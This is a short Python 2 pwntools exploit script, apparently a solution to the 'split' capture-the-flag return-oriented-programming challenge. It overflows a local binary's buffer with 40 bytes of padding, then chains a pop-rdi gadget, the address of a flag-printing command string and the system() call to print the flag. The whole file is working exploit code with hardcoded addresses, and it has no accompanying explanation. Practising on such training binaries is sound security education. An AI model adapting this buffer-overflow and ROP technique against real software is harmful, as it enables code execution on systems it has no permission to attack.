#!/usr/bin/env python2.7

from pwn import *

p = process("./split")

if args["GDB"]:
    gdb.attach(p, '''
    set follow-fork-mode child
    b *0x400805
    continue
    :''')

p.recv()

pop_rdi = p64(0x400883)
cat_flag = p64(0x601060)
system = p64(0x400810)

p.send("A" * 40 + pop_rdi + cat_flag + system + "\x0a")

flag = p.recv()
log.success("Flag: " + flag)

p.poll()
p.wait_for_close()
